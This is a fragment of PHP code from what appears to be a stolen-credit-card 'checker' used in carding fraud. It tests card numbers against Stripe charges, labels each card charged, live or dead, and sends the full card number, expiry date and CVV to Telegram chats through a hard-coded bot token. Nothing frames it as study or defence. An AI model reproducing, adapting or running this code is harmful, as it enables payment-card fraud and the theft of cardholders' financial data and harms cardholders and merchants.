...
if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1       Charged ✅        【﻿Ｐａｒｖｅｘ】 <br>';
$chargedcc = urlencode("
$cc|$mes|$ano|$cvv");
file_get_contents("https://api.telegram.org/bot5595238721:AAFI4icpN1pFw_QB0TBUQOkmFbG9O1tRy7Y/sendMessage?chat_id=5223680600&text=$0.5 Charged ✅<code>$chargedcc</code> %0A @ParvezOnFire2&parse_mode=HTML");

$chargedcc = urlencode("
$cc|$mes|$ano|$cvv");
file_get_contents("https://api.telegram.org/bot5595238721:AAFI4icpN1pFw_QB0TBUQOkmFbG9O1tRy7Y/sendMessage?chat_id=1001305532031&text=$0.5 Charged ✅<code>$chargedcc</code> %0A @ParvezOnFire2&parse_mode=HTML");
...
$livecc = urlencode("
$cc|$mes|$ano|$cvv");
file_get_contents("https://api.telegram.org/bot5595238721:AAFI4icpN1pFw_QB0TBUQOkmFbG9O1tRy7Y/sendMessage?chat_id=5223680600&text=<code>$livecc</code> %0A&parse_mode=HTML");
...
elseif(strpos($result3, "lost_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY ABDULKUDDUS </span> <br>';
}
